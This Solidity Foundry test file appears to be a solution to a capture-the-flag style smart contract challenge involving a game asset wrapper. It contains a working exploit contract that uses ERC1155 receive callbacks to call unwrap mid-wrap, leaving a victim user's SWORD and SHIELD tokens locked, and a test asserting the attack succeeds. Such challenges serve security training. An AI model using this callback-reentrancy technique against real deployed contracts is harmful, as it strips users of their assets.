// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// utilities
import {Test} from "@forge-std/Test.sol";
import {console} from "@forge-std/console.sol";
// core contracts
import {GameAsset} from "src/Game-Assets/GameAsset.sol";
import {AssetWrapper, IGameAsset} from "src/Game-Assets/AssetWrapper.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";

contract Attack is ERC1155Receiver {
    AssetWrapper assetWrapperContract;
    address public nft;

    constructor(address assetAddress) {
        assetWrapperContract = AssetWrapper(assetAddress);
    }
    function wrapTheToken(address nftAddress) public {
        nft = nftAddress;
        assetWrapperContract.wrap(0, address(this), nftAddress);
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4) {
        assetWrapperContract.unwrap(address(this), nft);
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    
    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns(bytes4) {
        assetWrapperContract.unwrap(address(this), nft);
        return bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"));
    }

}


contract GameAssetTest is Test {

    address attacker = makeAddr('attacker');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    AssetWrapper assetWrapper;
    GameAsset swordAsset;
    GameAsset shieldAsset;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying core contracts
        vm.prank(admin);
        assetWrapper = new AssetWrapper('');

        vm.prank(admin);
        swordAsset = new GameAsset('SWORD','SWORD');
        vm.prank(admin);
        shieldAsset = new GameAsset('SHIELD','SHIELD');

        // whitelist the two assets for use in the game
        vm.prank(admin);
        assetWrapper.updateWhitelist(address(swordAsset));
        vm.prank(admin);
        assetWrapper.updateWhitelist(address(shieldAsset));

        // set operator of the two game assets to be the wrapper contract
        vm.prank(admin);
        swordAsset.setOperator(address(assetWrapper));
        vm.prank(admin);
        shieldAsset.setOperator(address(assetWrapper));

        // adminUser is the user you will be griefing
        // minting 1 SWORD & 1 SHIELD asset for adminUser
        vm.prank(admin);
        swordAsset.mintForUser(adminUser,1);
        vm.prank(admin);
        shieldAsset.mintForUser(adminUser,1);

    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);
        Attack attack = new Attack(address(assetWrapper));
        attack.wrapTheToken(address(swordAsset));
        attack.wrapTheToken(address(shieldAsset));
        vm.stopPrank();

        assertEq(swordAsset.balanceOf(adminUser),0);
        assertEq(shieldAsset.balanceOf(adminUser),0);

        assertEq(swordAsset.balanceOf(address(assetWrapper)),1);
        assertEq(shieldAsset.balanceOf(address(assetWrapper)),1);

        assertEq(assetWrapper.balanceOf(adminUser,0),0);
        assertEq(assetWrapper.balanceOf(adminUser,1),0);
    }
}